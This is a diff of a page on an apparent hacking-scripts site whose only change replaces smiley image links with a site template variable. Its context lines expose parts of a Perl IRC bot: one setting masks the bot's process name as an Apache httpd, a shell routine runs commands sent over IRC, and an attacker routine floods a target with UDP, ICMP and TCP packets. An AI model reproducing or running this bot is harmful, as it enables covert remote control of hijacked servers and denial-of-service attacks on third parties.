@@ -2587,7 +2587,7 @@ $file="
 ################ CONFIGURACAO #################################################################
 my \$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #
 #----------------------------------------------################################################
-my \$linas_max='48'; # Evita o flood <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> depois de X linhas #
+my \$linas_max='48'; # Evita o flood <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> depois de X linhas #
 #----------------------------------------------################################################
 my \$sleep='4'; # ele dorme X segundos #
 ##################### IRC #####################################################################
@@ -2627,7 +2627,7 @@ exit if \$pid;
 die \"Problema com o fork: $!\" unless defined(\$pid);
 my \$dcc_sel = new IO::Select-&gt;new();
 #############################
-# B0tchZ na veia ehehe <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" /> #
+# B0tchZ na veia ehehe <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" /> #
 #############################
 \$sel_cliente = IO::Select-&gt;new();
 sub sendraw {
@@ -2870,7 +2870,7 @@ sub shell {
   my \$printl=\$_[0];
   my \$comando=\$_[1];
   if (\$comando =~ /cd (.*)/) {
-    chdir(\"$1\") || msg(\"\$printl\", \"Dossier Makayench <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> \");
+    chdir(\"$1\") || msg(\"\$printl\", \"Dossier Makayench <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> \");
     return;
   }
   elsif (\$pid = fork) {
@@ -2917,7 +2917,7 @@ sub attacker {
        send(SOCK2, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{udp}++;
        send(SOCK3, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{icmp}++;
        send(SOCK4, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{tcp}++;
-       # DoS ?? <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" />
+       # DoS ?? <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" />
        for (my \$pc = 3; \$pc &lt;= 255;\$pc++) {
          next if \$pc == 6;
          \$cur_time = time - \$itime;
